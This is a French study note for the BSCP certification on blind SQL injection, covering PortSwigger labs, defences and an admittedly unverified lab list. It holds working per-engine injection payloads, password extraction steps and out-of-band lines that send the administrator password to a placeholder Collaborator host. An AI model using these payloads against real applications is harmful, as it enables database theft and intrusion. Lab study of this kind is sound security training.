---
tags:
  - bscp
  - server-side
  - sql-injection
niveau: practitioner
statut: en cours
---
# Blind-SQL-injection

## En bref
- Injection SQL où les réponses HTTP ne contiennent ni les résultats de la requête injectée, ni le détail des erreurs de la base de données.
- **Limite des techniques classiques** : les attaques `UNION` sont inefficaces, car elles reposent sur la possibilité de voir les résultats de la requête dans la réponse.
- On déduit l'information à partir d'un **signal indirect** : contenu de la page, erreur, temps de réponse ou interaction réseau.
- Les extractions se font une information à la fois (caractère par caractère), donc beaucoup de requêtes : on automatise avec Burp Intruder.

## Types et variantes
| Variante | Signal observé | Quand l'utiliser |
|---|---|---|
| Réponses conditionnelles | Le contenu change (message, nombre de lignes) | Premier réflexe : la page réagit à une condition vraie ou fausse |
| Réponses conditionnelles avec erreurs | Une erreur SQL change la réponse (code 500, page d'erreur) | Le contenu ne change pas, mais on peut provoquer une erreur à la demande |
| Erreurs verbeuses | Le message d'erreur affiche une valeur | Les erreurs SQL sont affichées à l'écran |
| Délais (time delays) | Le temps de réponse | Aucun changement de contenu ni d'erreur |
| Hors bande (OAST) | Une requête DNS ou HTTP reçue sur un serveur contrôlé | La requête est exécutée de façon asynchrone, aucun autre signal |

Ordre de test conseillé : conditionnelle, puis erreurs, puis délais, puis hors bande.

### Blind SQLi - Réponses conditionnelles
- Exemple : une application utilise un cookie de suivi pour collecter des données analytiques. Chaque requête contient `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`.
- Pour savoir s'il s'agit d'un utilisateur connu, elle exécute : `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`.
- La requête est vulnérable, mais ses résultats ne sont pas envoyés à l'utilisateur.
- L'application se comporte différemment selon que la requête renvoie ou non des données : si le `TrackingId` est reconnu, la réponse contient le message « Welcome back ».

### Blind SQLi - Réponses conditionnelles avec erreurs
- Cas : aucune différence de contenu, mais une erreur SQL change la réponse.
- Principe : provoquer une erreur uniquement si la condition est vraie. Condition vraie : erreur. Condition fausse : page normale.
- Exemples (`cond` est la condition à tester) :
	- Oracle : `' || (SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '`
	- SQL Server : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)--`
	- PostgreSQL : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)--` (le `(SELECT 0)` empêche l'optimiseur d'évaluer la division par zéro à la planification)
	- MySQL : la division par zéro ne provoque pas d'erreur en lecture, on utilise une sous-requête qui renvoie plusieurs lignes : `' AND IF(cond,(SELECT table_name FROM information_schema.tables),'a')-- -`
- Extraction : remplacer `cond` par `SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'` (`SUBSTR` pour Oracle, PostgreSQL, MySQL ; `SUBSTRING` sur SQL Server).

### Blind SQLi - Erreurs verbeuses
- Cas : le message d'erreur SQL est affiché et peut citer une valeur.
- PostgreSQL : forcer une conversion de type qui échoue : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`. `LIMIT 1` n'existe ni sur SQL Server (`SELECT TOP 1 ...`) ni sur Oracle (`ROWNUM=1` ou `FETCH FIRST 1 ROWS ONLY`).
- MySQL : `' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))-- -`
- Une seule ligne par sous-requête, sinon l'erreur devient « more than one row ».
- Si le message est tronqué, vider la valeur d'origine du cookie pour gagner de la place.

### Blind SQLi - Délais (time delays)
- Cas : ni contenu ni erreur ne changent, seul le temps de réponse varie.
- Délai simple de 10 secondes :
	- Oracle : `x'||dbms_pipe.receive_message(('a'),10)--`
	- SQL Server : `'; WAITFOR DELAY '0:0:10'--` (requête empilée obligatoire)
	- PostgreSQL : `'||pg_sleep(10)--`
	- MySQL : `' AND SLEEP(10)-- -` (voir le piège plus bas)
- Délai conditionnel :
	- Oracle : `' || (SELECT CASE WHEN (cond) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--`
	- SQL Server : `'; IF (cond) WAITFOR DELAY '0:0:10'--`
	- PostgreSQL : `'; SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END--` (dans un cookie, encoder `;` en `%3B`)
	- MySQL : `' AND IF(cond,SLEEP(10),0)-- -`
- Piège MySQL : `AND SLEEP(10)` ne s'exécute que pour les lignes retenues. Si la requête ne renvoie aucune ligne, il n'y a aucun délai. Préférer `IF(cond,SLEEP(10),0)` sur un identifiant valide.
- Preuve attendue : environ 10 secondes si la condition est vraie, quasi nul si elle est fausse, de façon reproductible.

### Blind SQLi - Hors bande (OAST, out-of-band application security testing)
- Cas : la requête est exécutée en tâche de fond, aucun signal direct. On force la base à émettre une requête DNS ou HTTP vers un serveur contrôlé (Burp Collaborator). `COLLAB` désigne le sous-domaine Collaborator.
- Oracle : `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual--`. Sur une base corrigée : `UTL_INADDR.get_host_address('COLLAB')` (privilèges élevés requis).
- SQL Server : `'; exec master..xp_dirtree '//COLLAB/a'--`
- PostgreSQL : `'; copy (SELECT '') to program 'nslookup COLLAB'--` (privilèges élevés requis)
- MySQL : `LOAD_FILE('\\\\COLLAB\\a')`, Windows uniquement.
- Exfiltration : placer le résultat d'une sous-requête dans le sous-domaine. Oracle : `http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/`
- Dans un cookie ou une URL, encoder `%`, `?`, `:`, `;`, le signe égal et les espaces.
- Preuve attendue : une interaction DNS ou HTTP reçue dans Collaborator, avec la valeur extraite dans le sous-domaine.

> [!warning] Payloads non rejoués
> Les payloads des variantes erreurs, délais et hors bande, ainsi que le tableau des syntaxes par moteur, viennent de la cheat sheet PortSwigger et d'une revue technique, sans exécution sur une base. Les rejouer sur chaque lab correspondant avant de les considérer fiables.

## Comment détecter
Les tests génériques (apostrophe, `OR 1=1`, délais, OAST) sont dans [[SQL-injection]]. Ici, uniquement ce qui est propre à l'aveugle.
- **Condition booléenne** : envoyer deux requêtes qui ne diffèrent que par la condition.
	- Chaîne : `x' AND '1'='1` puis `x' AND '1'='2`.
	- Numérique : `x AND 1=1` puis `x AND 1=2`.
- **Différences de réponse à comparer** (Burp Repeater, Comparer, Intruder) :
	- Contenu : présence d'un message, nombre de lignes affichées.
	- Longueur de la réponse (colonne Length d'Intruder).
	- Code HTTP, redirection, en-têtes (`Set-Cookie`).
	- Temps de réponse (variante par délai).
- **Test de syntaxe** : `'` puis `''`. Une erreur puis un retour à la normale indique que le guillemet est interprété. Si l'erreur est masquée, comparer le contenu.
- **Concaténation neutre** : `x'||'` (Oracle, PostgreSQL) ou `x'+'` (SQL Server). Une réponse inchangée suggère une injection dans une chaîne.
- **Aucune différence visible** : tester les erreurs conditionnelles, puis les délais, puis l'OAST.
- **Confirmation** : la différence doit être reproductible et dépendre de la condition (vrai donne A, faux donne B, plusieurs fois de suite).

## Comment exploiter (principe)
### Blind SQLi - Réponses conditionnelles
- On injecte une condition vraie ou fausse dans le cookie et on observe la présence ou l'absence du message « Welcome back ».
- Deux requêtes sont envoyées tour à tour, avec ces valeurs pour `TrackingId` :
	- `…xyz' AND '1'='1` : condition vraie, la requête renvoie des résultats, « Welcome back » s'affiche.
	- `…xyz' AND '1'='2` : condition fausse, aucun résultat, le message n'apparaît pas.
- **Conséquence** : on peut obtenir la réponse (vrai ou faux) à n'importe quelle condition injectée. Les données s'extraient une information à la fois (par exemple « le premier caractère du mot de passe est-il `a` ? »).

### Extraire un mot de passe caractère par caractère
- Hypothèse de l'exemple : une table `Users` avec les colonnes `Username` et `Password`, et un utilisateur `Administrator`.
- Dans les charges utiles de type chaîne (`xyz' AND '1'='1`), le dernier guillemet n'est pas écrit : c'est celui de la requête d'origine qui le fournit et ferme la chaîne. La comparaison numérique de l'étape 2 n'en a pas besoin.
- **Étape 1 : longueur.** `LENGTH(password)>N` (`LEN` sur SQL Server) avec N croissant (Repeater) jusqu'à ce que la condition devienne fausse. Cela borne le nombre de positions à tester.
- **Étape 2 : comparaisons sur le code du caractère.** Charge utile avec `SUBSTRING` (PostgreSQL, MySQL, SQL Server ; seul `SUBSTR` existe sur Oracle) :
	- `xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'),1,1)) > 109--`
	- Vrai : le code est supérieur à 109 (`m`). Faux : il est inférieur ou égal.
- **Étape 3 : recherche par dichotomie.** On coupe l'intervalle en deux à chaque requête : environ 7 requêtes par caractère sur 128 valeurs, contre jusqu'à 36 en testant a-z puis 0-9. On termine par une égalité sur le code exact, par exemple `ASCII(...) = 115`
- On répète pour chaque position jusqu'au mot de passe complet.
- **Pourquoi `ASCII(...)` plutôt qu'une comparaison de texte** : l'opérateur d'égalité est insensible à la casse par défaut sur MySQL et SQL Server. Comparer le code du caractère donne la casse exacte.

### Automatiser avec Burp Intruder
- Intruder énumère les charges utiles, il ne fait pas de dichotomie adaptative. La dichotomie se fait à la main ou par script.
- Une position (le caractère) et un jeu de charges : attaque Sniper, en changeant l'index à la main entre deux séries.
- Deux positions (index et caractère) et deux jeux de charges : attaque Cluster bomb. Nombre de requêtes : longueur du mot de passe multipliée par la taille du jeu (par exemple 20 x 36 = 720).
- Détecter le succès : onglet Settings, section Grep - Match, vider la liste puis ajouter « Welcome back ». Ou trier par longueur de réponse.
- Variante par délai : régler le Resource pool à une seule requête simultanée, sinon les délais se chevauchent et faussent la mesure.

### Syntaxes par moteur (d'après la cheat sheet PortSwigger)
`cond` désigne la condition à tester.

| Besoin | Oracle | MySQL | PostgreSQL | SQL Server |
|---|---|---|---|---|
| Sous-chaîne | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` |
| Longueur | `LENGTH(s)` | `LENGTH(s)` (en octets) | `LENGTH(s)` | `LEN(s)` |
| Code du caractère | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` |
| Condition | `CASE WHEN cond THEN a ELSE b END` | `IF(cond,a,b)` ou `CASE` | `CASE WHEN cond THEN a ELSE b END` | `CASE`, ou `IF cond` (empilé) |
| Délai | `dbms_pipe.receive_message(('a'),10)` | `SLEEP(10)` | `pg_sleep(10)` | `WAITFOR DELAY '0:0:10'` |
| Commentaire | `--` | `-- ` (avec espace) ou `#` | `--` | `--` |
| Concaténation | `'a'\|\|'b'` | `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` |
| Requêtes empilées | non | rare | oui | oui |
| `SELECT` sans table | exige `FROM dual` | oui | oui | oui |
| Limiter à une ligne | `FETCH FIRST 1 ROWS ONLY` ou `ROWNUM=1` | `LIMIT 1` | `LIMIT 1` | `TOP 1` |
| Version | `SELECT banner FROM v$version` | `@@version` | `version()` | `@@version` |

- Dans le tableau Markdown, le `\|` est échappé ; l'écrire normalement (`||`) dans les payloads.
- MySQL : `||` vaut `OR` par défaut, ce n'est pas une concaténation.

## Pièges et points d'attention BSCP
Les pièges communs (commentaire MySQL, encodage URL, `OR 1=1` sur écriture) sont dans [[SQL-injection]].
- **Point d'injection** : souvent le cookie `TrackingId`, pas un paramètre. Tester aussi `session`, les autres cookies et les en-têtes (`X-Forwarded-For`, `Referer`, `User-Agent`).
- **`TrackingId` et `session`** : injecter dans `TrackingId` en laissant `session` intact, sinon la réponse change pour une autre raison (déconnexion).
- **Encodage dans un cookie** : `;` sépare les cookies, donc l'encoder en `%3B` pour les requêtes empilées. Le comportement de `+` dans un cookie est à tester (hypothèse non vérifiée : il ne serait pas décodé en espace).
- **Oracle** : tout `SELECT` exige `FROM dual`, la concaténation se fait avec `||`, la sous-chaîne avec `SUBSTR`.
- **Longueur d'abord** : déterminer la longueur du mot de passe avant de lancer Intruder.
- **Requêtes asynchrones** : si ni contenu, ni erreur, ni délai ne réagissent, la requête est probablement exécutée en tâche de fond. Passer à l'OAST.
- **Privilèges** : `xp_dirtree`, `COPY ... TO PROGRAM` et `UTL_INADDR` peuvent exiger des droits élevés.
- **Outils tiers** : vérifier dans les règles officielles de l'examen si sqlmap est autorisé avant de compter dessus.

## Prévention
Voir [[SQL-injection]] (requêtes paramétrées, moindre privilège). Spécifique aux variantes aveugles :
- Paramétrer toutes les requêtes, y compris celles qui utilisent des cookies et des en-têtes, qui sont des entrées non fiables. Les noms de colonnes et les `ORDER BY` dynamiques passent par une liste blanche.
- Valider le format d'un identifiant de suivi (longueur, jeu de caractères) avant la requête.
- Renvoyer des réponses uniformes : même contenu, même code HTTP et même temps de réponse que la requête réussisse ou échoue, sans page d'erreur détaillée.
- Compte de base de données sans accès aux fonctions réseau (`xp_dirtree`, `UTL_INADDR`, `COPY ... PROGRAM`, `LOAD_FILE`) ni aux requêtes empilées inutiles.
- Filtrer les flux sortants : le serveur de base de données ne doit pas pouvoir émettre de DNS ou de HTTP vers Internet, ce qui bloque l'OAST.
- Surveiller les requêtes lentes répétitives (délais) et les rafales d'erreurs SQL.

## Labs PortSwigger
Tous les labs de la catégorie sont de niveau Practitioner, d'après l'agent (liste et moteurs non revérifiés en ligne).
- [x] Blind SQL injection with conditional responses (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with conditional errors (Oracle probable) ✅ 2026-11-02
- [x] Visible error-based SQL injection (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with time delays (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with time delays and information retrieval (PostgreSQL probable) ✅ 2026-11-02
- [x] Blind SQL injection with out-of-band interaction (Oracle probable) ✅ 2026-11-02
- [x] Blind SQL injection with out-of-band data exfiltration (Oracle probable) ✅ 2026-11-02

## Journal des labs
### Lab: Blind SQL injection with conditional responses
- **Énoncé** : injection aveugle dans le cookie de suivi `TrackingId`. Le résultat n'est pas renvoyé et aucune erreur n'est affichée, mais la page contient « Welcome back » si la requête renvoie au moins une ligne. Table `users` (colonnes `username` et `password`). Objectif : se connecter en tant que `administrator`.
- **Moteur** : PostgreSQL probable, non vérifié (`LIMIT 1` et `LENGTH` supposent PostgreSQL ou MySQL).
- **Méthode** (valeur d'origine du cookie notée `xyz` ; le dernier `'` manquant dans chaque payload est fourni par la requête d'origine)
	1. Intercepter la requête avec Burp et modifier `TrackingId`.
	2. Vérifier vrai et faux : `xyz' AND '1'='1` (message présent), `xyz' AND '1'='2` (message absent).
	3. Confirmer la table : `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
	4. Confirmer l'utilisateur : `xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
	5. Longueur du mot de passe, avec N croissant dans Repeater : `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a`. Résultat : 20 caractères.
	6. Envoyer la requête dans Intruder, position sur le dernier `a` : `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`. Jeu de charges : a-z puis 0-9 (le mot de passe est supposé alphanumérique minuscule). Grep - Match : « Welcome back ».
	7. Relancer en changeant l'offset de 1 à 20, noter le caractère trouvé à chaque position.
	8. Se connecter via « My account » avec le mot de passe obtenu.
- **Pièges rencontrés** : à compléter.
- **Statut et date** : à compléter.

### Modèle pour les autres labs
```markdown
### Lab: <titre exact PortSwigger>
- **Énoncé** : (2 à 3 lignes en français)
- **Moteur et variante** : (Oracle, PostgreSQL... ; conditionnelle, erreur, délai ou OAST)
- **Signal observé** : (contenu, erreur, temps ou interaction)
- **Méthode** :
	1.
- **Payloads clés** (exacts) :
	- `...`
- **Pièges rencontrés** :
- **Statut et date** :
```

## Liens
- [[SQL-injection]]
- [[SQL-injection-Union-Attacks]]
- [[Payloads-cheatsheet]]
- [[Using-Burp-Suite]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
